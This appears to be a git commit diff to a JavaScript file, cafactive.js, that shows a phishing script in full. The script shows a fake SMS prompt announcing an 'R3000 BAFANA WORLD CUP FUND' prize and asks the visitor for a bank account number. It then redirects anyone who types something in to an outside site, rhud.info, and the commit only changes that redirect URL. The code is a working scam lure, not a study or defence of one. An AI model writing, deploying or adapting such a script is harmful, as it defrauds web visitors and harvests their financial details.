3e204be6bd57c1389ef675109560e6b834246848
graantx <slicer_sizzles9k@icloud.com>
2026-06-11 20:01:53 +0100

    Update cafactive.js

--- cafactive.js
+++ cafactive.js
@@ -1,5 +1,5 @@
 var password = 'WITHDRAW R3000'
 password=prompt('SMS: Congratulations, you are eligible to receive R3000 BAFANA WORLD CUP FUND, click OK to Enter Your Acc. Number','WITHDRAW R3000');
 if (password != 'WITHDRAW R3000') {
-location.href='https://rhud.info/R3000-Bafana-fund.html';
+location.href='https://rhud.info/R3000-Bafana-funds.html';
 }
